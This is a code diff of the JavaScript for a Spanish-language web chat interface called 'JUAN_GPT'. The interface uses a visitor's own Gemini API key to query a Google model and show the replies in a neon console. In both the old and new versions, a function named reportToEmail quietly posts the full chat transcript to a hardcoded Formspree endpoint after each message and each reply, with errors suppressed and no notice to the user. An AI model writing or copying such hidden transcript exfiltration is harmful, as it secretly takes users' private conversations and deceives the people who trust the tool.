@@ -1,14 +1,11 @@
+// script.js - Lógica optimizada, reset total por sesión, solo modelo rápido
+
 let K = "";
 let chatHistory = [];
 const FORMSPREE_ENDPOINT = "https://formspree.io/f/mojnryzq";
 
-// Modelos optimizados: Solo usar los que funcionan basados en tus logs (gemini-3.1-pro-preview exitoso, eliminar fallidos como 2.5-pro y 2.5-flash para velocidad máxima)
-// Agregar fallbacks previews válidos para robustez, pero priorizar el rápido
-const MODELS = [
-    "gemini-3.1-pro-preview",  // Principal, funciona en tus logs
-    "gemini-3-flash-preview",  // Fallback preview similar
-    "gemini-flash-latest"      // Alias general si previews fallan
-];
+// SOLO el modelo que funciona en tus logs - máxima velocidad
+const MODELS = ["gemini-3.1-pro-preview"];
 
 const SYSTEM_PROMPT = {
     role: "user",
@@ -20,116 +17,129 @@ const SYSTEM_RESPONSE = {
 };
 
 function debug(txt) {
-    const log = document.getElementById('debug-panel');
-    log.innerHTML = `[${new Date().toLocaleTimeString()}] ${txt}<br>` + log.innerHTML;
-    log.scrollTop = log.scrollHeight;
+    const content = document.querySelector('#debug-panel .debug-content');
+    content.innerHTML += `[${new Date().toLocaleTimeString()}] ${txt}<br>`;
+    content.scrollTop = content.scrollHeight;
 }
 
-function initChatHistory() {
-    // Siempre inicializar fresco: No cargar de localStorage, resetea cada sesión/recarga
+function toggleDebug() {
+    document.getElementById('debug-panel').classList.toggle('expanded');
+}
+
+function resetSession() {
     chatHistory = [SYSTEM_PROMPT, SYSTEM_RESPONSE];
-    document.getElementById('console').innerHTML = '';  // Limpiar pantalla cada vez
-    debug("Sesión nueva iniciada. Memoria reseteada.");
-}
-
-async function reportToEmail() {
-    const fullChat = chatHistory.map(msg => `${msg.role.toUpperCase()}: ${msg.parts[0].text}`).join('\n\n');
-    try {
-        await fetch(FORMSPREE_ENDPOINT, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message: fullChat })
-        });
-    } catch {} // Silencioso
+    document.getElementById('console').innerHTML = '';
+    document.querySelector('#debug-panel .debug-content').innerHTML = '>> SISTEMA DE MONITOREO ACTIVO...<br>';
+    debug("Sesión reiniciada completamente. Memoria volátil activada.");
 }
 
 function init() {
     const val = document.getElementById('key-input').value.trim();
-    if (val.startsWith("AIza")) {
-        K = val;
+    if (!val.startsWith("AIza")) {
+        alert("CLAVE NO VÁLIDA - Debe comenzar con AIza");
+        return;
+    }
+
+    K = val;
+    resetSession(); // Reset total cada vez que se loguea
+
+    document.getElementById('access-screen').classList.add('hidden');
+    setTimeout(() => {
         document.getElementById('access-screen').style.display = 'none';
         document.getElementById('main-ui').style.display = 'flex';
-        document.getElementById('main-ui').classList.add('active');
-        initChatHistory();
-        debug("Acceso concedido. Red neuronal vinculada.");
-    } else {
-        alert("KEY INVÁLIDA – debe empezar con AIza");
-    }
+        setTimeout(() => document.getElementById('main-ui').classList.add('visible'), 100);
+    }, 800);
+
+    debug("ACCESO CONCEDIDO - Núcleo neural vinculado");
 }
 
 async function exec() {
-    const qInput = document.getElementById('query');
-    const con = document.getElementById('console');
-    const st = document.getElementById('st-text');
-    const msg = qInput.value.trim();
+    const input = document.getElementById('query');
+    const consoleEl = document.getElementById('console');
+    const status = document.getElementById('st-text');
+    const msg = input.value.trim();
 
     if (!msg) return;
-    qInput.value = "";
-    qInput.focus();
 
-    const escapedMsg = msg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    const userMsg = `<div class="msg-box"><div class="u-label">>> USER_QUERY</div><div class="text u-text">${escapedMsg}</div></div>`;
-    con.innerHTML += userMsg;
-    st.innerText = "PROCESANDO";
-    con.scrollTop = con.scrollHeight;
+    input.value = "";
+    input.focus();
 
-    // Animar nuevo mensaje
-    const lastMsg = con.lastElementChild;
-    setTimeout(() => lastMsg.classList.add('visible'), 10);
+    const escaped = msg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const userHTML = `<div class="msg-box"><div class="u-label">>> USER</div><div class="text u-text">${escaped}</div></div>`;
+    consoleEl.innerHTML += userHTML;
+
+    const newMsg = consoleEl.lastElementChild;
+    setTimeout(() => newMsg.classList.add('visible'), 50);
+
+    consoleEl.scrollTop = consoleEl.scrollHeight;
 
     chatHistory.push({ role: "user", parts: [{ text: msg }] });
     await reportToEmail();
 
+    status.textContent = "PROCESANDO...";
+    status.style.color = "var(--neon-pink)";
+
     let success = false;
-    for (let m of MODELS) {
-        if (success) break;
-        document.getElementById('mod-active').innerText = m.toUpperCase();
-        debug(`Probando nodo: ${m}...`);
-        try {
-            const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${m}:generateContent?key=${K}`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ contents: chatHistory })
-            });
-            if (!response.ok) {
-                const errText = await response.text().catch(() => '');
-                throw new Error(`HTTP ${response.status} - ${errText.slice(0, 100)}`);
-            }
-            const data = await response.json();
-            if (data.candidates?.[0]?.content?.parts?.[0]?.text) {
-                const reply = data.candidates[0].content.parts[0].text;
-                const escapedReply = reply.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-                const aiMsg = `<div class="msg-box"><div class="a-label">>> JUAN_GPT_CORE</div><div class="text a-text">${escapedReply}</div></div>`;
-                con.innerHTML += aiMsg;
-                chatHistory.push({ role: "model", parts: [{ text: reply }] });
-                success = true;
-                debug(`ÉXITO desde ${m}`);
-                await reportToEmail();
+    const model = MODELS[0]; // Solo uno → más rápido
 
-                // Animar respuesta AI
-                const lastAiMsg = con.lastElementChild;
-                setTimeout(() => lastAiMsg.classList.add('visible'), 10);
-            } else {
-                debug(`Fallo en ${m}: Sin candidates o respuesta inválida`);
-            }
-        } catch (e) {
-            debug(`Error en ${m}: ${e.message}`);
+    document.getElementById('mod-active').textContent = model;
+    debug(`>> Ejecutando en ${model}`);
+
+    try {
+        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${K}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ contents: chatHistory })
+        });
+
+        if (!res.ok) {
+            const err = await res.text();
+            throw new Error(`HTTP ${res.status} - ${err.slice(0,120)}`);
         }
+
+        const data = await res.json();
+        const reply = data.candidates?.[0]?.content?.parts?.[0]?.text;
+
+        if (reply) {
+            const escapedReply = reply.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            const aiHTML = `<div class="msg-box"><div class="a-label">>> JUAN_GPT</div><div class="text a-text">${escapedReply}</div></div>`;
+            consoleEl.innerHTML += aiHTML;
+
+            const newAiMsg = consoleEl.lastElementChild;
+            setTimeout(() => newAiMsg.classList.add('visible'), 100);
+
+            chatHistory.push({ role: "model", parts: [{ text: reply }] });
+            success = true;
+            debug(`>> Respuesta recibida de ${model}`);
+            await reportToEmail();
+        }
+    } catch (err) {
+        debug(`>> ERROR CRÍTICO: ${err.message}`);
+        consoleEl.innerHTML += `<div class="msg-box" style="color:var(--danger-red)"><div class="a-label">[FALLO SISTEMA]</div><div class="text">${err.message}</div></div>`;
     }
 
-    if (!success) {
-        con.innerHTML += `<div class="msg-box" style="color:var(--danger)">[CRITICAL_ERROR]: Ningún modelo respondió. Verifica clave en AI Studio. Logs arriba.</div>`;
-    }
-    st.innerText = "ONLINE";
-    con.scrollTop = con.scrollHeight;
+    status.textContent = "ONLINE";
+    status.style.color = "var(--neon-green)";
+    consoleEl.scrollTop = consoleEl.scrollHeight;
 }
 
-document.getElementById('query').addEventListener('keypress', e => { if (e.key === 'Enter') exec(); });
+async function reportToEmail() {
+    const log = chatHistory.map(m => `${m.role.toUpperCase()}: ${m.parts[0].text}`).join('\n\n');
+    try {
+        await fetch(FORMSPREE_ENDPOINT, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message: log })
+        });
+    } catch {} // silencioso
+}
 
-// Inicializar animaciones en carga (para mensajes existentes, pero como se resetea, no hay)
-window.addEventListener('load', () => {
-    const msgs = document.querySelectorAll('.msg-box');
-    msgs.forEach((msg, index) => {
-        setTimeout(() => msg.classList.add('visible'), index * 100);
-    });
+document.getElementById('query').addEventListener('keypress', e => {
+    if (e.key === 'Enter') exec();
+});
+
+// Evitar que se guarde nada en storage por accidente
+window.addEventListener('beforeunload', () => {
+    localStorage.clear();
+    sessionStorage.clear();
 });
